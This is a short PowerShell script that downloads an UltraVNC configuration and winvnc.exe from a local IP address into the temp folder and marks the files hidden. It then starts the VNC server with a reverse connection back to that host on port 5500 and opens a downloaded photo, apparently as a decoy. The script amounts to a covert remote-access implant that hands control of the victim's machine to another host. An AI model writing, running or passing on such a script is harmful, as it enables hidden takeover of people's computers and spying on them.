# Define the temp path to store the files
$tempPath = [System.IO.Path]::GetTempPath()

$url = "http://192.168.0.19/UltraVNC.ini"
$url2 = "http://192.168.0.19/winvnc.exe"
$url3 = "https://unsplash.com/photos/oIp0fSMDbLk/download?ixid=M3wxMjA3fDB8MXxhbGx8MXx8fHx8fHx8MTczMDIzNjM3N3w&force=true"

$filePath = Join-Path -Path $tempPath -ChildPath "UltraVNC.ini"
$filePath2 = Join-Path -Path $tempPath -ChildPath "winvnc.exe"
$filePath3 = Join-Path -Path $tempPath -ChildPath "kira.jpg"

# Download files and set them as hidden
Invoke-WebRequest -Uri $url -OutFile $filePath
Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $filePath2
Set-ItemProperty -Path $filePath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Check the validity of the third URL or remove this section if unnecessary
Invoke-WebRequest -Uri $url3 -OutFile $filePath3
Set-ItemProperty -Path $filePath3 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

$params = "-connect 192.168.0.19:5500"

# Start the processes
try {
    Start-Process -FilePath $filePath2
} catch {
    Write-Error "Failed to start process: $_"
}

try {
    Start-Process -FilePath $filePath2 -ArgumentList $params
} catch {
    Write-Error "Failed to start process: $_"
}

try {
    Start-Process $filePath3
} catch {
    Write-Error "Failed to start process: $_"
}
